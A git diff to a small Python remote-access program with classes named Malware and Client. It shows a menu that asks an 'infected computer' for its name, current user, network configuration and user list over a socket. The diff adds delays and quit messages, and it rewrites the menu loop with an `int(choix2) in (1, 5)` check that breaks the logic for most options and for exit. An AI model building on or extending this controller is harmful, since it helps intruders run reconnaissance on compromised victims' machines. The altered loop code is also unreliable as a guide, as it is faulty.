@@ -40,9 +40,12 @@ class Malware(Machine):
 
     def quit(self):
         try:
+            print("quitting")
+            time.sleep(3)
             self.my_socket.close()
         except:
             print("Nous avons quitter avec une erreur")
+            time.sleep(3)
 
     def get_socket(self):
         return self.my_socket
@@ -103,7 +106,7 @@ class Client(Machine):
         print("Press 3 to get the network configuration")
         print("Press 4 to get the list of users")
         choix2 = input()
-        while choix2 != "5":
+        while int(choix2) in(1, 5):
             if choix2 == "1":
                 self.send("computer")
                 print("\nComputer name : ", end="")
@@ -115,9 +118,10 @@ class Client(Machine):
                 self.send("users")
             else:
                 print("Enter a valid value!")
-            list_choix_valide = ["1", "2", "3", "4"]
-            if choix2 in list_choix_valide:
+
+            if int(choix2) in (1, 5):
                 self.receive()
+
             print("\n\nPress 1 to get the infected computer name")
             print("Press 2 to see who is the current user")
             print("Press 3 to get the network configuration")
